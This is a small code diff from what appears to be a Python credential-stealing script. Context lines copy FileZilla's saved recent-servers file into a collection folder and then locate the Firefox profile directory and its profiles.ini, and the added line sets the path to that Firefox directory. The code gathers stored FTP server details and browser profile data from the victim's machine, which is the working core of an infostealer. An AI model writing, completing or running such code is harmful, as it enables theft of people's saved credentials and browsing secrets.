@@ -56,6 +56,7 @@ file_path = os.path.join("C:/Users", user, "AppData/Roaming/FileZilla/recentserv
 if os.path.isfile(file_path):
     shutil.copy(file_path, cdfilezilla)
 #firefox
+file_path = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
 if  os.path.exists(file_path)  == True :
     mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
     mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
